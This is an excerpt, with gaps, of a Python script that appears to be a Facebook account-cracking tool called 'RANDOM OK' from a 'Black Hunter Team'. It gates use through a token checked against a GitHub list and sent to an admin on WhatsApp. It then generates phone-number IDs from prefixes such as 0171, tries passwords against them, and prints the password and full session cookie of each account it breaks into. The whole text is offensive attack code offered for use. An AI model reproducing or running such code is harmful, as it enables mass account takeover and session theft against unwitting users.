...
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mRANDOM OK
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/jahied/EC-170/blob/main/Random%20ok.txt').text
    if id in httpCaht:
      ...
      print("\33[1;37m----------------------------------------------")
      print("\33[1;37mFirst Approval Your Token")
      print('Welcome Come To Black Hunter Team')
      print('Your Token Send The Admin WhatsApp')
      print('\33[1;37m----------------------------------------------')
      print ('IF U DONT WANT TO PLS DONT PRESS ENTER')
      input('IF U WANT TO THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801747951169?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
...
def xxr():
    ...
    os.system("clear")
    print(logo)
    print(f' [{xr}^{x}] Example>: {xr}019,017,018,016,92302,92301,91778{x}')
    print(" ══════════════════════════════════════════")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[BHT-OK🔥] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🎯]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[BHT-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
